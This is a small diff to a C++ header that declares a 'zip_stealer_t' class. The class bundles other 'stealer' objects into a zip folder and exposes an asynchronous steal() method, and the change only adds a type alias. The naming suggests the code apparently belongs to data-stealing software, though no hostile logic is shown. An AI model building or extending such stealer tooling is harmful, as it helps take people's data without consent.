@@ -5,7 +5,9 @@
 class zip_stealer_t : public base_stealer_t
 {
 public:
-    explicit zip_stealer_t(std::vector<std::unique_ptr<base_stealer_t>>&& in_to_zip
+    using to_zip_t = std::vector<std::unique_ptr<base_stealer_t>>;
+
+    explicit zip_stealer_t(to_zip_t&& in_to_zip
         , const fs::path& in_zip_folder_path);
 
     asio::awaitable<std::unique_ptr<message_t>> steal() override;
